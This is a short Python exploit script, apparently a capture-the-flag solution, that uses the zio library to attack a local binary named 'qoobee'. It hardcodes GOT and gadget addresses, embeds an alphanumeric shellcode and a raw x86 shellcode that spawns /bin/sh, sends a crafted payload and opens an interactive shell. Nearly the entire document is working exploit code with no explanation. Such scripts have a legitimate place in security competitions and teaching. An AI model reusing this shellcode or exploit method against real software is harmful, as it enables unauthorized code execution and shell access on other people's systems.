'''
function -214 
patched in qoobee2
'''

from zio import *

target = './qoobee'
io = zio(target)

read_buf = l32(0x804c090)
call_edx = l32(0x0804887d)
str_flag = l32(0x08049F7E)
str_r = l32(0x08049F7C)
s = l32(0xffffce8d)
extern = l32(0x0804b7cc)
leave_ret = l32(0x08048a4f)
ppr = l32(0x0804992a)
pppr = l32(0x08049929)
# gen by alpha2 baseaddr is eax
shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"
# shellcode2  tiny sh without \x0b
shellcode2 = "\x31\xc9\xf7\xe1\xb0\xf4\xf6\xd0\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
read_got = l32(0x08048660)
fopen_got = l32(0x08048780)
write_got = l32(0x08048760)
data = l32(0x0804B7A8)
bss = l32(0x0804b7c0)
memcpy_got = l32(0x08048690)
mmap_got =l32(0x08048730)

payload =''

# mmap
payload += '-214\n'

# read shellcode to exec
payload += shellcode+'ymkelwin\n'

# print payload
io.write(payload)
io.interact()